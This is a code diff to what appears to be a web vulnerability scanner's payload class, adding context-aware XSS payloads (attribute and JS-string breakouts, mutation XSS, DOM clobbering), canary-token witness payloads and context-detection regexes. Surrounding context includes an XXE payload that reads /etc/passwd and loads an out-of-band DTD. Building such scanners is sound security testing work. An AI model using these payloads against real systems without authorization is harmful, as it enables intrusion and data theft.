@@ -64,6 +64,63 @@ class Payloads:
         '<details/open/ontoggle="alert(1)">',
     ]
 
+    # === Context-aware XSS payloads (Shannon-style witness payloads per render context) ===
+
+    # HTML_ATTRIBUTE context — break out of attribute value, inject event handler
+    XSS_ATTRIBUTE_CONTEXT = [
+        '" onmouseover="alert(1)"',
+        "' onmouseover='alert(1)'",
+        '" onfocus="alert(1)" autofocus="',
+        "' onfocus='alert(1)' autofocus='",
+        '" onclick="alert(1)"',
+        '"><img src=x onerror=alert(1)>',
+        "'><img src=x onerror=alert(1)>",
+        '" onerror="alert(1)" src="x',
+        "' onerror='alert(1)' src='x",
+        # Unquoted attribute context
+        ' onmouseover=alert(1) ',
+        ' onfocus=alert(1) autofocus ',
+        # Angle bracket in attribute — break out of tag entirely
+        '><script>alert(1)</script>',
+        # href attribute context (javascript: URL)
+        'javascript:alert(1)',
+        'javascript&#58;alert(1)',
+        'javascript&#x3A;alert(1)',
+    ]
+
+    # JAVASCRIPT_STRING context — break out of JS string literal
+    XSS_JS_STRING_CONTEXT = [
+        "'-alert(1)-'",
+        '"-alert(1)-"',
+        "';alert(1)//",
+        '";alert(1)//',
+        "\\';alert(1)//",
+        '\\"alert(1)//',
+        '</script><script>alert(1)</script>',
+        '\u0027-alert(1)-\u0027',
+        # Template literal context
+        '`-alert(1)-`',
+        '${alert(1)}',
+    ]
+
+    # Mutation XSS (mXSS) — payloads that exploit browser HTML-parser correction
+    XSS_MUTATION = [
+        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+        '<listing><img src=x onerror=alert(1)></listing>',
+        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
+        '<svg><![CDATA[><image xlink:href="]]><img/src=xx:x onerror=alert(2)//"></svg>',
+        '<table><tr><td><img src=x onerror=alert(1)></td></tr></table>',
+    ]
+
+    # DOM clobbering — inject HTML that overwrites JS globals
+    XSS_DOM_CLOBBERING = [
+        '<input id=config>',
+        '<form id=x><input id=y name=z></form>',
+        '<a id=defaultView><a id=defaultView name=opener>',
+        '<img name=innerHTML>',
+        '<input name=__proto__>',
+    ]
+
     XSS_DOM_BASED = [
         '#<script>alert(1)</script>',
         '"><script>alert(1)</script>',
@@ -598,6 +655,59 @@ class Payloads:
         'xxe': [
             '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "{oob}/xxe.dtd">%dtd;]><data>&send;</data>''',
         ]
+    }
+
+    # ===== CONTEXT-AWARE XSS WITNESS PAYLOADS =====
+    # A "witness payload" is one whose firing is unambiguous in a specific
+    # injection context.  The scanner first detects the reflection context via
+    # CONTEXT_DETECTION_PATTERNS, then sends only the matching payload set.
+    #
+    # Payload strings use {token} as a placeholder for a unique canary value
+    # so confirmed execution is distinguishable from coincidental matches.
+    CONTEXT_PAYLOADS = {
+        "html_body": [
+            '<script>document.title="HYDRAX{token}"</script>',
+            '"><img src=x onerror=document.title=\'HYDRAX{token}\'>',
+            '"><svg onload=document.title=\'HYDRAX{token}\'>',
+        ],
+        "html_attribute": [
+            '" onmouseover="document.title=\'HYDRAX{token}\'"',
+            "' onfocus='document.title=\"HYDRAX{token}\"'",
+            '" autofocus onfocus="document.title=\'HYDRAX{token}\'"',
+        ],
+        "js_string": [
+            '";document.title="HYDRAX{token}";//',
+            "';document.title='HYDRAX{token}';//",
+            '\\";document.title="HYDRAX{token}";//',
+        ],
+        "url_param": [
+            "javascript:document.title='HYDRAX{token}'",
+            "data:text/html,<script>document.title='HYDRAX{token}'</script>",
+        ],
+        "html_comment": [
+            '--><script>document.title="HYDRAX{token}"</script><!--',
+        ],
+    }
+
+    # ===== CONTEXT DETECTION PATTERNS =====
+    # Matched against the raw HTML surrounding the reflected marker.
+    # Keys map to the injection context names used in CONTEXT_PAYLOADS.
+    # {marker} is replaced with the escaped canary string at runtime.
+    CONTEXT_DETECTION_PATTERNS = {
+        "html_comment": [
+            r'<!--[^>-]*{marker}',
+        ],
+        "js_string": [
+            r'<script[^>]*>[^<]*{marker}',
+            r"on\w+\s*=\s*['\"][^'\"]*{marker}",
+        ],
+        "url_param": [
+            r'(?:href|src)\s*=\s*["\'][^"\']*[?&][^"\']*{marker}',
+        ],
+        "html_attribute": [
+            r'=\s*["\'][^<>"\']*{marker}',
+        ],
+        "html_body": [],  # default / fallback context
     }
 
     # ===== PAYLOAD ENCODING TECHNIQUES =====
